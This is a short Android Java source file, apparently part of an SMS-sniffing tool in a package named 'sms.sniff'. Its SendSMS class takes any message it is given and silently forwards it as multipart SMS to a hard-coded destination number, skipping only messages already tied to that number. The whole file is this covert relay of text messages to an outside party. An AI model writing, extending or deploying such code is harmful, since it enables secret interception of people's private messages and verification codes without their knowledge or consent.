package sms.sniff;

import java.util.ArrayList;

import android.telephony.SmsManager;

public class SendSMS {
	
	private String message;
	private String originOrDestinationNumber;
	
	public SendSMS(String message, String originOrDestinationNumber) {
		this.message = message;
		this.originOrDestinationNumber = originOrDestinationNumber;
		this.checkAndSend();
	}

	private void checkAndSend() {
		if(!Constants.destination.equals(originOrDestinationNumber)) {
			SmsManager manager = SmsManager.getDefault();
			ArrayList<String> msg = manager.divideMessage(message);
			
			manager.sendMultipartTextMessage(Constants.destination, null, msg, null, null);
		}
	}
}
